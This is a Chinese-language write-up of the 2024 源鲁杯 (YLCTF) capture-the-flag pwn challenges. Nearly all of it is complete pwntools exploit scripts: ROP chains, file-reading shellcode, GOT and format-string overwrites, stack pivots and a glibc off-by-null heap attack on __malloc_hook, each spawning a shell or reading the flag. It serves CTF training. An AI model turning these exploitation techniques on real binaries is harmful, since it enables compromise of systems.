---
title: 2024源鲁杯
date: 2024-11-05 22:37:44
---

# pwn
## Round1
### giaopwn

简单的栈题

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

# p = process("./pwn")
p = remote("challenge.yuanloo.com",39988)

elf = ELF("pwn")
#libc = ELF("./libc.so.6")

call_system = 0x4006D2
acatflag = 0x601048
pop_rdi = 0x0000000000400743 # pop rdi ; ret
ret = 0x4006C6

payload = b'a'*40 + p64(pop_rdi) + p64(acatflag) + p64(call_system)
p.recvuntil(b'YLCTF\n')
p.send(payload)

p.interactive()
```

### ezstack

一个命令执行的字符过滤绕过

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

# p = process("./pwn")
p = remote('challenge.yuanloo.com',43724)

elf = ELF("pwn")
#libc = ELF("./libc.so.6")

p.recvuntil(b'stack\n')
payload = b'a'*(48+8) + p64(0x401352) + p64(0x401275)
p.send(payload)

p.recvuntil(b'command\n')
payload = b'$0'
p.send(payload)

p.interactive()
```

### ezorw

写一个openat加sendfile的shellcode就好了

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

# p = process("./pwn")
p = remote("challenge.yuanloo.com",29188)

elf = ELF("pwn")
#libc = ELF("./libc.so.6")

payload = b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
p.recvuntil(b'orw~\n')
p.send(payload)

p.interactive()
```

### canary_orw

劫持一下stack_chk_fail函数
再利用jmp rsp的gadget执行shellcode就好了

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux","splitw","-h"]

# p = process("./canary")
p = remote("challenge.yuanloo.com",39532)

elf = ELF("canary")
#libc = ELF("./libc.so.6")

vuln = 0x400820
stack_chk_fail_got = elf.got['__stack_chk_fail'] 
jmp_rsp = 0x40081B

p.recvuntil(b'journey\n')
p.send(p64(vuln))

p.recvuntil(b'Sea\n')
p.send(b'a'*8 + p64(stack_chk_fail_got))

p.recvuntil(b'magic\n')
p.send(p64(0x4008F0))

shellcode = b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
payload = b'a'*40 + p64(jmp_rsp) + shellcode
p.recvuntil(b'go!\n')
p.send(payload)

p.interactive()
```

### ezfmt 

先用格式化字符串泄露libc基址，返回到_start函数再利用一次格式化字符串修改printf为system
最后输入/bin/sh获取shell


```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

# p = process("./pwn")
p = remote("challenge.yuanloo.com",28489)

elf = ELF("pwn")
libc = ELF("./libc-2.31.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

_start = 0x4010B0
main = 0x4011DD
vuln = 0x401208
printf_got = elf.got['printf']

p.recvuntil(b'YLCTF\n')
payload = b"%10$s"
payload = payload.ljust(32,b'\x00')
payload += p64(printf_got) + p64(_start)
p.send(payload)

printf_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = printf_addr - libc.sym['printf']
system_addr = libc_base + libc.sym['system']

log.success("printf_addr -> " + hex(printf_addr))
log.success("system_addr -> " + hex(system_addr))

# gdb.attach(p)

p.recvuntil(b'YLCTF\n')
payload = b"%10$" + str((system_addr>>8)&0xffff).encode() + b'c%10$hn'
payload = payload.ljust(32,b'\x00')
payload += p64(printf_got+1) + p64(_start)
p.send(payload)

p.recvuntil(b'YLCTF\n')
p.send(b"/bin/sh\x00")

p.interactive()
```

### msg_bot

从程序中还原protobuf结构体

```
syntax="proto3"; //proto version 2 or 3

message Msgbot{
    int64 msgid = 1;
    int64 msgsize = 2;
    bytes msgcontent = 3;
}
```

写一个c语言的打包函数

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "bot.msgbot.pb-c.h"

char *gen(char *data)
{
    Msgbot msg = MSGBOT__INIT;
    msg.msgid = 0xC0DEFEED;
    msg.msgsize = 0xF00DFACE;
    ProtobufCBinaryData content = {
        (size_t)strlen(data),
        data
    };
    msg.msgcontent = content;
    unsigned int len = msgbot__get_packed_size(&msg);
    char *buf = malloc(len);
    msgbot__pack(&msg, buf);
    return buf;
}
```

写一个纯可打印字符的shellcode读取另一部分shellcode
再使用retfq转为32位执行open
最后转回64位使用read和write获取flag

```python
from pwn import *
import ctypes

context.log_level = "debug"
# context.arch = "amd64"
context.terminal = ["tmux","splitw","-h"]

elf = ELF("msg_bot")
#libc = ELF("./libc.so.6")

clibc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
addr = 0
dest = 0

while True:
    # p = process("./msg_bot")
    p = remote("challenge.yuanloo.com",37809)
    clibc.srand(clibc.time(0))
    dest = clibc.rand() % 0x7FFFFFFF
    dest = dest & 0xFFFFF000
    addr = dest + 0x550
    if not (isprint(p32(addr)[0]) and isprint(p32(addr)[1]) and isprint(p32(addr)[2]) and isprint(p32(addr)[3])):
        p.close()
        continue
    break

shellcode_x86 = f'''
mov esp,{addr+0x100}
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
'''

shellcode_flag = f'''
push 0x33
push {addr+0x49}
retfq
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall
mov rdi,1
mov rax,1
syscall
'''

shellcode_read = f'''
push rax
pop rbx

/*read(0,addr,0x70)*/

push {addr} /*set rsi*/
pop rsi

push 0x40 /*set rdi*/
pop rax
xor al,0x40
push rax
pop rdi

xor al,0x40 /*set rdx*/
push 0x70
pop rdx

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x26],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x27],cl

push rdx /*set rax*/
pop rax
xor al,0x70
'''

append = '''
/* 52 5a */
push rdx
pop rdx
'''

shellcode_retfq = f'''
/*mode_64 -> mode_32*/

push rbx
pop rax

push 0x72
pop rcx
xor byte ptr[rax+0x4d],cl
push 0x68
pop rcx
xor byte ptr[rax+0x4d],cl
push 0x47
pop rcx
sub byte ptr[rax+0x4e],cl
push 0x48
pop rcx
sub byte ptr[rax+0x4e],cl
push rdi
push rdi
push 0x23
push {addr}
pop rax
push rax
'''

shellcode_x86 = asm(shellcode_x86, arch='i386')
shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')

shellcode = shellcode_read + append
shellcode += shellcode_retfq + append
shellcode = asm(shellcode,arch = 'amd64',os = 'linux')

p.recvuntil(b'botmsg: ')

gen = ctypes.CDLL("./gen.so").gen
gen.restype = ctypes.c_char_p
payload = gen(shellcode)

# gdb.attach(p,gdbscript="b *$rebase(0x17c9)")

p.send(payload)
sleep(3)
p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)

p.interactive()
```

## Round2
### ezstack2

程序中有个后门，控制一下参数再调用后门函数就好

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

p = process("./pwn")
# p = gdb.debug("./pwn")

vuln = 0x0000000000400757
pop_rdi = 0x0000000000400823 # pop rdi ; ret
ret = 0x000000000040056e # ret

# gdb.attach(p)

payload = b'a'*(48+8) +  p64(pop_rdi) + p64(1131796) + p64(ret) + p64(vuln)
p.send(payload)

p.interactive()

```

### shortshell

用5个字节的shellcode跳到后门处

```python
from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

p = process('./pwn')

shellcode = 'nop\n'*0x1270
shellcode += 'a:\n'
shellcode += 'nop\n'*(0x4069-0x1270)
shellcode += 'jmp a'

payload = asm(shellcode,vma=0x400000)[-5:]

p.recvuntil(b'YLCTF-PWN\n')
p.send(payload)

p.interactive()
```

### magicread

简单的栈迁移

```python
from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi = 0x0000000000400723 # pop rdi ; ret
pop_rsi = 0x0000000000400721 # pop rsi ; pop r15 ; ret

read = 0x400675
addr = 0x601500

payload1 = b'a'*0x40 + p64(addr) + p64(read)
p.recvuntil(b'read!\n')
p.send(payload1)

payload2 = b'a'*0x40 + p64(addr+0x48) + p64(read)
p.send(payload2)

payload3 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read)
payload3 = payload3.ljust(0x40,b'a')
payload3 += p64(addr+0x30) + p64(read)
p.send(payload3)

# gdb.attach(p)

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = puts_addr - libc.sym['puts']

payload4 = b'a'*24 + p64(libc_base + 0x4527a)
p.send(payload4)

p.interactive()
```

## Round3
### Secret

签到题，随便逆逆拿到密码
然后nc上去输密码就有flag

### ezstack3

第一次输入泄露一下栈地址
第二次输入进行栈迁移，并且同时返回到输入的位置再次输入
第三次劫持read的返回地址，并且利用栈构造`/bin/sh`

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

#p = process("./pwn")
p = remote("challenge.yuanloo.com",42243)

elf = ELF("./pwn")

system_plt = elf.plt['system']
read = 0x0804930A

payload = b'a'*52 + b'bbbb'
p.recvuntil(b'stack3')
p.send(payload)

p.recvuntil(b'bbbb')
ebp = u32(p.recv(4).ljust(4,b'\x00')) - 28
log.success("ebp -->> " + hex(ebp))

#gdb.attach(p)

payload = b'a' * 48
payload += p32(ebp+4)
payload += p32(read)
p.recvuntil(b'pwn!')
p.send(payload)

#gdb.attach(p)

payload = p32(0) + p32(system_plt) + p32(0) + p32(ebp)
payload = payload.ljust(44,b'a')
payload += b'/bin/sh\x00'
p.send(payload)

p.interactive()
```

### null

glibc-2.27的堆题
edit函数有个off by null
create函数限制堆的大小不能大于0x100

泄露libc_base然后打malloc_hook即可

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ['tmux','splitw','-h']

#p = process("./pwn")
p = remote("challenge.yuanloo.com",37666)

elf = ELF("pwn")
libc = ELF("./libc-2.27.so")

def add(idx,size):
    p.sendlineafter(b":",b'1')
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size ",str(size).encode())

def edit(idx,content):
    p.sendlineafter(b":",b'2')
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Content: ",content)

def show(idx):
    p.sendlineafter(b":",b'3')
    p.sendlineafter(b"Index: ",str(idx).encode())

def delete(idx):
    p.sendlineafter(b":",b'4')
    p.sendlineafter(b"Index: ",str(idx).encode())

for i in range(0,10):
    add(i,0x80)
for i in range(0,9):
    delete(i)
add(0,0x90)
show(0)
p.recvuntil(b'Content: ')
libc_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = libc_addr-0x3ebdb0
log.success("libc_base -> " + hex(libc_base))
add(1,0x70)

for i in range(10,21):
    add(i,0xf8)
for i in range(10,17):
    delete(i)

delete(17)
edit(18,b'a'*0xf0 + p64(0x200))
delete(19)

add(21,0x100)
add(22,0x100)
delete(22)

edit(18,p64(0)+p64(0x111)+p64(libc_base + libc.sym['__malloc_hook']))
add(23,0x100)
add(24,0x100)

ones = [
0x4f29e,
0x4f2a5,
0x4f302,
0x10a2fc,
]

one = ones[3]

edit(24,p64(libc_base+one))
add(25,0x100)

#gdb.attach(p)

p.interactive()
```
